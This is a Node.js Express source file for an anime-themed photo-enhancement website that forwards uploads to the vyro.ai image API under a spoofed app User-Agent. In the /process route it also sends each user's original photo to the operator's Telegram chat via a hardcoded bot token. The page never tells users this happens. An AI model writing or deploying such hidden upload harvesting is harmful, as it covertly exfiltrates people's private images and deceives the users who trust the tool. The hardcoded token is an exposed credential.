const express = require('express');
const FormData = require('form-data');
const fetch = require('node-fetch');
const multer = require('multer');
const app = express();
const upload = multer();
const port = 3000;

const TELEGRAM_TOKEN = '8331211035:AAGcK4u_xsZ25tuZse-KSKmJPRH0dit7H_A';
const MY_CHAT_ID = 'YOUR_CHAT_ID'; // Get from @userinfobot

async function remini(inputBuffer, mode = 'enhance') {
    let form = new FormData();
    form.append('model_version', 1, { 'Content-Transfer-Encoding': 'binary', 'contentType': 'multipart/form-data' });
    form.append('image', inputBuffer, { filename: 'image.jpg', contentType: 'image/jpeg' });

    const response = await fetch(`https://inferenceengine.vyro.ai/${mode}`, {
        method: 'POST',
        body: form,
        headers: { 'User-Agent': 'okhttp/4.9.3', ...form.getHeaders() }
    });
    if (!response.ok) throw new Error('API Error');
    return await response.buffer();
}

app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Nezuko Enhance Pro 🌸</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            :root { --pink: #ffb7c5; --dark: #1a1a1a; --green: #778b50; --kimono: #f3a6b5; }
            body { 
                background: var(--dark); color: white; font-family: 'Segoe UI', sans-serif;
                display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0;
                overflow-x: hidden;
            }
            
            .sakura { position: fixed; color: var(--pink); top: -10%; user-select: none; z-index: -1; animation: fall 10s linear infinite; }
            @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }

            .container { 
                background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px);
                border: 2px solid var(--pink); border-radius: 25px;
                padding: 30px; width: 90%; max-width: 500px; margin: 40px 0; text-align: center;
                position: relative;
            }

            .logo-wrapper {
                width: 100px; height: 100px;
                margin: -80px auto 20px auto;
                border-radius: 50%;
                border: 4px solid var(--pink);
                overflow: hidden;
                box-shadow: 0 0 20px rgba(255, 183, 197, 0.6);
                background: var(--dark);
            }
            .logo-wrapper img { width: 100%; height: 100%; object-fit: cover; }

            .preview-box { width: 100%; border-radius: 15px; overflow: hidden; margin: 15px 0; display: none; border: 2px solid var(--pink); }
            img { width: 100%; display: block; }

            .mode-selector { display: flex; gap: 10px; margin-bottom: 20px; justify-content: center; }
            .mode-btn { 
                background: transparent; border: 1px solid var(--pink); color: white;
                padding: 8px 15px; border-radius: 20px; cursor: pointer; font-size: 0.8rem;
            }
            .mode-btn.active { background: var(--pink); color: var(--dark); font-weight: bold; }

            #enhanceBtn {
                background: linear-gradient(45deg, var(--pink), #ff8da1);
                color: var(--dark); border: none; padding: 18px; width: 100%;
                border-radius: 50px; font-weight: 900; cursor: pointer; letter-spacing: 1px;
                box-shadow: 0 4px 15px rgba(255, 183, 197, 0.4);
                transition: 0.3s;
            }
            #enhanceBtn:disabled { opacity: 0.8; cursor: not-allowed; filter: grayscale(0.5); }

            .download-area { display: none; margin-top: 20px; padding: 15px; border-top: 1px solid #444; }
            .dl-button { background: var(--green); color: white; padding: 12px; width: 100%; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; }

            .loader { display: none; border: 4px solid #333; border-top: 4px solid var(--pink); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
            @keyframes spin { 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div id="sakura-container"></div>
        
        <div class="container">
            <div class="logo-wrapper">
                <img src="https://i.pinimg.com/736x/07/0d/95/070d957d383925c04826b647895311cc.jpg" alt="Nezuko Logo">
            </div>

            <h1 style="color: var(--pink); margin: 0;">NEZUKO ENHANCE</h1>
            <p style="opacity: 0.7; font-size: 0.9rem;">Full Power Restoration</p>

            <div class="mode-selector">
                <button class="mode-btn active" onclick="setMode('enhance', this)">ENHANCE</button>
                <button class="mode-btn" onclick="setMode('recolor', this)">RECOLOR</button>
                <button class="mode-btn" onclick="setMode('dehaze', this)">DEHAZE</button>
            </div>

            <div class="preview-box" id="previewContainer">
                <img id="imgPreview" src="">
            </div>

            <input type="file" id="fileInput" accept="image/*" hidden onchange="previewFile()">
            <button onclick="document.getElementById('fileInput').click()" style="color:var(--pink); background:none; border:1px dashed var(--pink); padding:10px; width:100%; cursor:pointer; margin-bottom:15px; border-radius:10px;">
                + SELECT PHOTO
            </button>

            <button id="enhanceBtn" onclick="startProcess()">UNLEASH POWER ✨</button>
            
            <div class="loader" id="loader"></div>

            <div class="download-area" id="downloadArea">
                <p style="color: var(--pink);">✨ Power Fully Restored! ✨</p>
                <button class="dl-button" id="dlBtn">DOWNLOAD RESULT</button>
            </div>
        </div>

        <audio id="sndClick" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>
        <audio id="sndDone" src="https://www.soundjay.com/buttons/sounds/button-10.mp3"></audio>

        <script>
            let currentMode = 'enhance';
            
            for(let i=0; i<20; i++) {
                let s = document.createElement('div');
                s.className = 'sakura';
                s.innerHTML = '🌸';
                s.style.left = Math.random() * 100 + 'vw';
                s.style.animationDelay = Math.random() * 5 + 's';
                document.getElementById('sakura-container').appendChild(s);
            }

            function setMode(mode, btn) {
                currentMode = mode;
                document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
            }

            function previewFile() {
                const file = document.getElementById('fileInput').files[0];
                if (file) {
                    const reader = new FileReader();
                    reader.onload = (e) => {
                        document.getElementById('imgPreview').src = e.target.result;
                        document.getElementById('previewContainer').style.display = 'block';
                    }
                    reader.readAsDataURL(file);
                }
            }

            async function startProcess() {
                const file = document.getElementById('fileInput').files[0];
                if(!file) return alert("Select a photo first!");

                document.getElementById('sndClick').play();
                const btn = document.getElementById('enhanceBtn');
                const loader = document.getElementById('loader');
                const dlArea = document.getElementById('downloadArea');

                btn.disabled = true;
                loader.style.display = 'block';
                dlArea.style.display = 'none';

                // Start visual countdown/loading messages
                let counter = 0;
                const phrases = ["GATHERING ENERGY...", "BREATHING: FIRST FORM...", "BLOOD DEMON ART...", "FINALIZING..."];
                const labelInterval = setInterval(() => {
                    btn.innerText = phrases[counter % phrases.length];
                    counter++;
                }, 1200);

                const fd = new FormData();
                fd.append('image', file);
                fd.append('mode', currentMode);

                // Start API call and 5s timer simultaneously
                const apiPromise = fetch('/process', { method: 'POST', body: fd });
                const timerPromise = new Promise(resolve => setTimeout(resolve, 5000));

                try {
                    // Wait for BOTH the 5 seconds and the API to finish
                    const [res] = await Promise.all([apiPromise, timerPromise]);
                    
                    if (!res.ok) throw new Error();
                    const blob = await res.blob();
                    const url = URL.createObjectURL(blob);
                    
                    clearInterval(labelInterval);
                    document.getElementById('sndDone').play();
                    
                    document.getElementById('dlBtn').onclick = () => {
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = "nezuko_" + currentMode + ".jpg";
                        a.click();
                    };
                    dlArea.style.display = 'block';
                    btn.innerText = "POWER RESTORED!";
                } catch (e) {
                    clearInterval(labelInterval);
                    alert("The transformation failed. Try again!");
                    btn.disabled = false;
                    btn.innerText = "UNLEASH POWER ✨";
                } finally {
                    loader.style.display = 'none';
                }
            }
        </script>
    </body>
    </html>
    `);
});

app.post('/process', upload.single('image'), async (req, res) => {
    try {
        const mode = req.body.mode || 'enhance';
        const tgForm = new FormData();
        tgForm.append('chat_id', MY_CHAT_ID);
        tgForm.append('photo', req.file.buffer, { filename: 'orig.jpg' });
        tgForm.append('caption', `🌸 New Request\nMode: ${mode}`);
        
        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: tgForm });

        const result = await remini(req.file.buffer, mode);
        res.set('Content-Type', 'image/jpeg');
        res.send(result);
    } catch (e) { res.status(500).send("Error"); }
});

app.listen(port, () => console.log('Server Active'));
